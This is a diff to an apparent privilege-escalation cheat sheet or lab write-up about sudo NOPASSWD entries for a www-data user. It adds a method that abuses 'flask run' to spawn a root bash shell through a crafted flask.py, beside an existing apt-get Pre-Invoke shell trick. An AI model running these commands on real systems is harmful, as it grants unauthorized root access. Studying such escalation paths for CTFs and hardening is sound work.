@@ -170,6 +170,7 @@ User www-data may run the following commands on <hostname>
 - (root) NOPASSWD: /usr/bin/xargs
 - (root) NOPASSWD: /usr/bin/anansi_util
 - (root) NOPASSWD: /usr/bin/apt-get
+- (root) NOPASSWD: /usr/bin/flask run
 - (root) NOPASSWD: /usr/bin/wget
 
 
@@ -287,6 +288,13 @@ sudo /home/anansi/bin/anansi_util manual /bin/bash
 apt-get
 ```
 sudo apt-get update -o APT::Update::Pre-Invoke::=”/bin/bash -i”
+```
+
+flask run
+```
+echo 'import pty; pty.spawn(“/bin/bash”)' > flask.py
+export FLASK_APP=flask.py
+sudo /usr/bin/flask run
 ```
 
 Wget
